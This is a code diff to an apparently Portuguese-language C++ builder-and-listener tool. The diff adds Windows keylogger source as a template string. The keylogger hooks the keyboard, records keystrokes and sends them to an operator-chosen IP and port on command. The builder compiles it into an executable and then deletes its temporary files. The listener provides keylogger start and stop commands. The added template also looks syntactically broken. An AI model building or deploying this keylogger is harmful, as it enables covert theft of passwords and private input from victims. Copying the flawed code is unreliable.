@@ -35,9 +35,9 @@ char buffer[1024] = {0};
 const char* hello = "Hello from server";
 
 //Variaveis utilizadas no builder:
-std::string build_content_1 = "#include <winsock2.h>\n#include <windows.h>\n#include <iostream>\n#include <ws2tcpip.h>\n#include <cstring>\nint main() {\nWSADATA wsaData;\nSOCKET clientSocket = INVALID_SOCKET;\nstruct sockaddr_in serverAddress;\nconst char* hello = \"Hello from client\";\nchar buffer[1024] = {0};\nif (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\nstd::cerr << \"Falha na inicialização do Winsock\" << std::endl;\nreturn -1;\n}\n/* Criando o socket*/\nif ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {\nstd::cerr << \"Falha na criação do socket\" << std::endl;\nWSACleanup();\nreturn -1;\n}\nserverAddress.sin_family = AF_INET;\nserverAddress.sin_port = htons(";
+std::string build_content_1 = "#include <winsock2.h>\n#include <iostream>\n#include <thread>\n#include <string>\n#include <windows.h>\nint sResult = 0;\nstd::string log = \"\";WSADATA wsaData;SOCKET clientSocket = INVALID_SOCKET;struct sockaddr_in serverAddress;char buffer[1024];LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam){KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);switch (wParam){case WM_KEYDOWN:char c = MapVirtualKey(s->vkCode, MAPVK_VK_TO_CHAR); log += c;break;}return CallNextHookEx(NULL, nCode, wParam, lParam);	}void connection();void k_log();int main(){std::thread t_connection(connection);std::thread t_k_log(k_log);t_connection.join();t_k_log.join();return 0;}void connection(){if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {std::cerr << \"Falha na inicialização do Winsock\" << std::endl;}if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {std::cerr << \"Falha na criação do socket\" << std::endl;WSACleanup();}serverAddress.sin_family = AF_INET;serverAddress.sin_port = htons(";
 std::string build_content_2 = ");\nserverAddress.sin_addr.s_addr = inet_addr(\"";
-std::string build_content_3 = "\");\nif (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {\nstd::cerr << \"Erro na conexão com o servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nif (send(clientSocket, hello, strlen(hello), 0) < 0) {\nstd::cerr << \"Erro no envio de dados ao servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nif (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {\nstd::cerr << \"Erro na recepção da resposta do servidor\" << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn -1;\n}\nstd::cout << \"Resposta do servidor: \" << buffer << std::endl;\nclosesocket(clientSocket);\nWSACleanup();\nreturn 0;\n}";
+std::string build_content_3 = "\");if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {std::cerr << \"Erro na conexão com o servidor\" << std::endl;closesocket(clientSocket);WSACleanup();}while(1){memset(buffer, 0, 1024);	if (recv(clientSocket, buffer, sizeof(buffer), 0) < 0) {std::cerr << \"Erro na recepção da resposta do servidor\" << std::endl;closesocket(clientSocket);WSACleanup();}if(buffer[0] == \'R\'){std::cout << \"Enviando \" << log << \" ao servidor\\n\";sResult = send(clientSocket, log.c_str(), strlen(log.c_str()), 0);log = \"\";if (sResult < 0) {std::cerr << \"Erro no envio de dados ao servidor\" << std::endl;closesocket(clientSocket);WSACleanup();}else{}std::cout << \"Resposta do servidor: \" << buffer << std::endl}closesocket(clientSocket);WSACleanup();void k_log(){HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KBDHook, 0, 0);MSG message;while (GetMessage(&message, NULL, NULL, NULL) > 0){TranslateMessage(&message);DispatchMessage(&message);}UnhookWindowsHookEx(kbd);}";
 
 //Declaração das funçôes
 int port_extractor();
@@ -223,8 +223,9 @@ int open_listener()
         return -1;
     }
 
-        std::cout << "Cliente conectado com sucesso\n";
 	estado_de_conexao = true;
+	system("clear");
+        std::cout << "Cliente conectado com sucesso\n";
 
 	//Caso o listener seja iniciado, o programa não fecha e segue:
 	std::cout << "Listener\n";
@@ -256,6 +257,7 @@ int open_listener()
 			++i;
 
 			if(command[i] == 'h'){
+				system("clear");
 				std::cout << "\nklog <start/stop> <Parâmetros do start>\n";
 				std::cout << "--begin        Inicia o Keylogger\n";
 				std::cout << "--end 	      Para o Keylogger\n";
@@ -301,6 +303,8 @@ int open_listener()
 						sleep(klog_update_time);
 					}
 
+				std::cout << "A conexão foi fechada nesse caraio de porra\n";
+
 				}else if(command[i] == 'o')
 				{
 					std::cout << "Gravar em arquyivo\n";
@@ -338,7 +342,7 @@ int open_listener()
 
 int builder()
 {
-        std::ofstream arquivocpp("build.cpp");
+        std::ofstream arquivocpp("tempf_build.cpp");
 
         arquivocpp << build_content_1;
         arquivocpp << port;
@@ -348,11 +352,12 @@ int builder()
 
         arquivocpp.close();
 
-        std::ofstream call_compiler("call_compiller.sh");
-        call_compiler << "i686-w64-mingw32-g++ build.cpp -o build.exe -lws2_32 -static-libgcc -static-libstdc++";
+        std::ofstream call_compiler("tempf_call_compiller.sh");
+        call_compiler << "i686-w64-mingw32-g++ tempf_build.cpp -o build.exe -lws2_32 -static-libgcc -static-libstdc++ -std=c++11";
         call_compiler.close();
-        system("chmod +x ./call_compiller.sh && ./call_compiller.sh");
+        system("chmod +x ./tempf_call_compiller.sh && ./tempf_call_compiller.sh");
 
         std::cout << ".exe gerado com sucesso\n";
+	system("rm tempf*");
 return 0;
 }
